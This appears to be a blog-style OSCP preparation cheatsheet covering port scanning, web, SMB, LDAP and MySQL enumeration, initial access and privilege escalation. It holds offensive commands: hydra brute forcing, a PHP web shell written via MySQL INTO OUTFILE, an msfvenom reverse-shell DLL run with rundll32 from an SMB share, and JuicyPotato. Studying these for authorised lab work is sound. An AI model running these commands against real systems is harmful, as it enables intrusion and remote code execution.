---
layout: post
title: "OSCP Cheatsheet"
description: "Resource collection for OSCP preparation"
comments: false
keywords: "oscp, cheatsheet"
---

Resource collection for OSCP preparation

# Recon

## Port Scanning

### NMAP

Options
```
-sC Default Scripts
-sV Enumerate version
-oA Output to file
-v Verbose
```
Usage Example
```
sudo nmap -sC -sV -oA nmap.output -v
```

Full TCP scan

```
sudo nmap -sC -sV -O -p- -oA nmap.full_tcp 
```

Full UDP scan

```
sudo nmap -sU -O -p- -oA nmap.full_udp 
```

## VHost/DNS Discovery

Discover hidden subdomains based on the top 1 Million DNS names 
```
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-110000.txt
```

Usage Example:
```
gobuster vhost -u URL -w subdomains-top1million-110000.txt -t 100 -k
gobuster dns -d streamio.htb -w subdomains-top1million-110000.txt -t 100
```

## Web Services Enumeration

### Checklist

- [ ] Read entire pages. Enumerate for emails, names, user info etc.
- [ ] Directory discovery
- [ ] Enum the interface, version of CMS? Server installation page?
- [ ] Potential vulnerability? LFI, RFI, XEE, Upload?
- [ ] Default web server page, version information
- [ ] View source code
- [ ] Robots.txt
- [ ] Web scanning

### Wordlist

SecLists
```
https://github.com/danielmiessler/SecLists
```

Dirbuster wordlists
```
/usr/share/dirbuster/wordlists/
```

IIS directory
```
https://raw.githubusercontent.com/digination/dirbuster-ng/master/wordlists/vulns/iis.txt
```

### Tools

**feroxbuster**

```
feroxbuster -u IP -x EXTENSION -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100
```

**Dirbuster**

**gobuster**

### CeWL (Custom Word List generator)

CeWL (Custom Word List generator) is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper. Optionally, CeWL can follow external links.

```
cewl -d 2 -m 5 -w cewl.txt HOST
```

The output of this tool can be used as input for the Wordpress scanner

### Wordpress Scanner

WPScan WordPress Security Scanner

```
wpscan --url "URL" 
```

NOTE: Pay attention to the plugin version and check for exploits

WPScan WordPress Security Scanner Enumerate users

```
wpscan --rua --url <URL> -P <PASSWORDS_LIST> -U "<USER>,<USER>"
```

### Robots.txt

```
wget --header "User-Agent: Googlebot-Image" http://192.168.98.14/robots.txt
```

### Local File Inclusion

## FTP
Default Port: 21

### Anonymous login check 
```
ftp <ip address>
username : anonymous
pwd : anonymous
file upload -> put shell.php
```

## NFS
Default Port: 2049

```
showmount -e HOST_IP
```
If everyone in some remote folder lets mount it
```
mkdir /mnt/FOLDERNAME
sudo mount -t nfs HOST_IP:/FOLDER /mnt/FOLDERNAME
```

## SMB

Default Port: 139, 445

### Checklist

- [ ] Enumerate Hostname using nmblookup
- [ ] Enumerate using crackmapexec
- [ ] Enumerate Shares
- [ ] Check Null Sessions
- [ ] Check for Vulnerabilities
- [ ] Overall Scan using enum4linux

https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#checklist

#### Enumerate Hostname nmblookup
Enumerate Hostname using **nmblookup**

Options
```
-A look up by IP address
```

Usage Example
```
nmblookup -A IP_ADDR
```

#### Enumerate using crackmapexec
Enumerate whatever we can on the box using crackmapexec
```
crackmapexec smb HOST_IP
```
Enumerate the shares (Remember to test the quest account)
```
crackmapexec smb HOST_IP --shares (Remember to user black username and password using -u "" -p "")
crackmapexec smb HOST_IP -u 'guest' -p '' --shares
```

#### Enumerate Shares

Enumerate Hostname using **smbmap**, **crackmapexec**, **smbclient**, **nmap**

```
smbmap -H [ip] -u "" -p ""
crackmapexec smb HOST_IP --shares (Remember to user black username and password using -u "" -p "")
smbclient -L \\\\[ip]
nmap --script smb-enum-shares -p 139,445 [ip]
```

Remember to re-run when you get new credentials

#### Check Null Sessions

Check Null Sessions using **smbmap**, **rpcclient**, **smbclient**

```
smbmap -H [ip/hostname]
rpcclient -U "" -N [ip]
smbclient \\\\[ip]\\[share name]
```

#### Check for Vulnerabilities

Check for Vulnerabilities using **nmap**

```
nmap --script smb-vuln* -p 139,445 [ip]
```

#### Overall Scan using enum4linux

Not very efficient but sometimes you can get info such as password policy

```
enum4linux -a [ip]
```

## LDAP

```
nmap -n -sV --script "ldap* and not brute"

ldapsearch -h <IP> -x -s base
ldapsearch -h <IP> -x -D '<DOMAIN>\<USER>' -w '<PASSWORD>' -b "DC=<1_SUBDOMAIN>,DC=<TDL>"
```

## MySQL

### nmap Scan
Scan the MySQL port in order to enumerate and find vuln using NMap

```
nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 IP -p PORT
```

### Brute Force using hydra

```
hydra -l USER -P rockyou.txt IP mysql
```

### Connection

```
# Local
mysql -u <USER>
mysql -u <USER> -p

# Remote
mysql -h <IP> -u <USER>
```

### Usefull commands

```
show databases;
use <DATABASES>;

show tables;
describe <TABLE>;

select * from <TABLE>;

# Try to execute code
select do_system('id');
\! sh

# Read & Write
select load_file('<FILE>');
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
```

### Fernet Decoder

https://asecuritysite.com/encryption/ferdecode

# Initial Access

## SSH Bruteforce

```
hydra -l USERNAME -p PASSWORD_LIST IP -t 4 ssh
```

## Shell stable

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

## Setup an SMB share using impacket

```
impacket-smbserver -ip $IP smb $FOLDER_LOCATION
```

## Executing a dll from an SMB Share

Generate payload
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.242 LPORT=4444 EXITFUNC=thread -f dll -o shell.exe
```

Execute
```
rundll32.exe \\IP\smb\shell.dll,0
```

# Priv Escalation

## Linux

### Checklist

- [ ] Password reuse (mysql, .bash_history, 000- default.conf...)
- [ ] Checking sudo permissions (sudo -l)
- [ ] Check binary with SUID set ([https://gtfobins.github.io/](https://gtfobins.github.io/#+suid))

### Bypass Restricted Shells

https://vk9-sec.com/linux-restricted-shell-bypass/

Restore Env variables:

```
export PATH=/bin:/usr/bin/:$PATH
export SHELL=/bin/bash:$SHELL
```

## Windows 

### Checklist

- [ ] Check priv using the whoami \all 

### JuicyPotato

When you’ve found yourself as a low-level user on a Windows machine, it’s always worthwhile to check what privileges your user account has. If you have the SeImpersonatePrivilege, there is a very simply attack vector that you can leverage to gain SYSTEM level access.
https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/

Executable:
```
https://github.com/ohpe/juicy-potato
.\JuicyPotato.exe -t * -p c:\path\to\executable.bat -l 9002
```




